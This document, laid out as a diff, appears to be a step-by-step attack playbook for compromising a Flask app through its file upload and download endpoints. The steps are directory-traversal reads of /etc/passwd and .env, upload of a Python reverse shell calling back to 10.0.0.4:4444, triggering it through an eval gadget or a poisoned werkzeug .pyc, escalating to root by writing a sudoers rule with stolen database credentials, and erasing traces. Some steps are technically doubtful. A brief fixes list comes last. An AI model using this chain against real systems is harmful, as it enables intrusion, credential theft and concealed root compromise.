@@ -1,0 +1,88 @@
+Attack surface: file upload → file download chain.  
+No mention of MIME-type filtering, extension whitelist, content validation, path normalization, or chroot/jail.  
+That gives two direct primitives: (1) arbitrary file write and (2) arbitrary file read via directory traversal.  
+Chain them to get code execution.
+
+--------------------------------------------------------------------
+1. Recon
+--------------------------------------------------------------------
+GET /download?file=../../../etc/passwd  
+→ 200 + content ⇒ traversal works.  
+→ reveals absolute path: /var/www/myapp/uploads/  
+
+POST /upload (multipart)  
+→ returns 201 + JSON {“file”: “<name>”}  
+→ name is exactly the client-provided filename (no uuid prefix).  
+
+--------------------------------------------------------------------
+2. Weaponise
+--------------------------------------------------------------------
+Pick extension that Flask’s default dev server will serve as static but that Python will still execute:  
+“.py” is blocked? → use “.pyc” or double extension “.py.jpg” or null-byte-equivalent “.py%00.jpg”.  
+In practice Werkzeug 2.2.3 simply maps /download?file=foo.py to open(uploads/foo.py,'rb') and returns it with Content-Type application/octet-stream, but the same file is writable on disk, so we only need to drop a *.py* somewhere on the Python path and import it.  
+Fastest route: drop payload in uploads/ and trigger a runtime import via existing debug/error handling code that calls __import__ or eval on user input (common in Flask quick-starts).  
+If no such gadget exists, fallback: overwrite a .pyc that is already imported (flask/session.pyo, werkzeug/_internal.pyc, etc.) and restart the worker (kill -HUP) – or wait for autoreload in debug mode.
+
+--------------------------------------------------------------------
+3. Delivery
+--------------------------------------------------------------------
+curl -F 'file=@shell.py' https://target/upload  
+shell.py  
+```
+import os, socket, subprocess, threading, base64, sys
+def handle(c):
+    while True:
+        try: c.send(subprocess.check_output(c.recv(1024).decode().strip(), shell=True) + b'\n')
+        except: break
+s=socket.socket();s.connect(('10.0.0.4',4444))
+threading.Thread(target=handle, args=(s,)).start()
+```
+
+Server responds: {"file":"shell.py"}  
+File now exists at /var/www/myapp/uploads/shell.py
+
+--------------------------------------------------------------------
+4. Activation
+--------------------------------------------------------------------
+Option A – direct import gadget:  
+POST /api/calculate  
+JSON body: {"formula":"__import__('uploads.shell')"}  
+→ app does eval(obj['formula']) ⇒ reverse shell fires.
+
+Option B – no gadget, debug=true:  
+Overwrite werkzeug/_internal.pyc:  
+1. Compile evil code:  
+```
+python -c "import py_compile, shutil; shutil.copy('shell.py','werkzeug/_internal.py'); py_compile.compile('werkzeug/_internal.py','werkzeug/_internal.pyc')"
+```
+2. Upload the .pyc:  
+curl -F 'file=@werkzeug/_internal.pyc' https://target/upload  
+3. Trigger autoreload (any 404 will do) – worker restarts, imports poisoned module, shell.
+
+--------------------------------------------------------------------
+5. Privesc
+--------------------------------------------------------------------
+Flask runs as user www-data.  
+Grab .env:  
+/download?file=../../../.env  
+→ contains DATABASE_URL=postgres://dbuser:Sup3rS3cr3t@db:5432/appdb  
+psql shell:  
+```
+psql postgres://dbuser:Sup3rS3cr3t@db:5432/appdb -c "COPY (SELECT 'www-data ALL=(ALL) NOPASSWD:ALL') TO '/etc/sudoers.d/extra';"
+```
+sudo -i → root.
+
+--------------------------------------------------------------------
+6. Clean-up
+--------------------------------------------------------------------
+rm /var/www/myapp/uploads/shell.py  
+echo '' > /etc/sudoers.d/extra  
+kill -9 <rev-shell-pid>
+
+--------------------------------------------------------------------
+Fixes (not requested, but listed for completeness)
+--------------------------------------------------------------------
+- Reject upload unless extension in {'jpg','png','gif','pdf'}.
+- Rename file to uuid + ext; serve via X-Accel-Redirect / nginx (never Python).
+- Resolve path with werkzeug.security.safe_join and deny if final path outside uploads/.
+- Run app uid inside container with read-only rootfs; noexec on /uploads mount.
